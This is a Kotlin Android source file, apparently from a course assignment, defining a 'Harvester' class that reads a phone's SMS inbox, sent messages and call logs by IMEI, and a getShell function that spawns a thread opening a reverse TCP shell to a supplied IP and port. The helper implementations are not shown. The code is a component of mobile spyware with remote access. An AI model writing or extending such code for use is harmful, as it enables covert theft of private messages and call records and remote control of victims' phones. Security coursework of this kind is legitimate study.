package com.example.assignment1

import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import com.example.assignment1.DataRetriever.CallLog
import com.example.assignment1.DataRetriever.smsLog
import kotlin.concurrent.thread

class Harvester(var activity: Activity, var context: Context, var imei: String) {

//    init{
//        ActivityCompat.requestPermissions(activity,
//        arrayOf(android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CALL_LOG),
//        100)
//    }

    fun getSMS(){
        println("SMS inbox")
        val inbox = smsLog(context, imei).readSMSBox("inbox")
        println(inbox)
        println("SMS sent")
        val sent = smsLog(context, imei).readSMSBox("sent")
        println(sent)
    }

    fun getCallLog(){
        println("Call Logs")
        val callLogs = CallLog(context, activity, imei).readLogs()
        //println(callLogs)
    }

//    @RequiresApi(Build.VERSION_CODES.O)
    fun getShell(ip: String, port: Int){
     /*   checkNetworkPermission()
        checkStoragePermission()*/
        // shellGetter.main()
        // This would be a good place to have the threading I think
        println(reverseShell.getShellPath())
        thread(start = true){
//            newShell().main()
            reverseShell.reverse_tcp(ip, port)
        }

    }

    private fun checkSMSPermission() {
        // Ask for permission!
        if(ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
//            && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS)
//            != PackageManager.PERMISSION_GRANTED
        )
        {
            ActivityCompat.requestPermissions(activity, arrayOf(android.Manifest.permission.READ_SMS), 101)
            return
        }
    }

    private fun checkCallLogPermission() {
        // Ask for permission!
        if(ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED
        )
        {
            ActivityCompat.requestPermissions(activity, arrayOf(android.Manifest.permission.READ_CALL_LOG), 101)
            return
        }
    }

    private fun checkNetworkPermission(){
        // Ask for permission!
        if(ActivityCompat.checkSelfPermission(context, android.Manifest.permission.INTERNET)
            != PackageManager.PERMISSION_GRANTED
            && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_NETWORK_STATE)
            != PackageManager.PERMISSION_GRANTED
        )
        {
            ActivityCompat.requestPermissions(activity, arrayOf(android.Manifest.permission.INTERNET), 101)
            ActivityCompat.requestPermissions(activity, arrayOf(android.Manifest.permission.ACCESS_NETWORK_STATE), 101)

            return
        }
    }

    private fun checkStoragePermission() {
        // Ask for permission!
        if(ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE)
            != PackageManager.PERMISSION_GRANTED
            && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
            != PackageManager.PERMISSION_GRANTED
        )
        {
            ActivityCompat.requestPermissions(activity, arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE ), 101)
            ActivityCompat.requestPermissions(activity, arrayOf(android.Manifest.permission.WRITE_EXTERNAL_STORAGE ), 101)
            return
        }
    }
}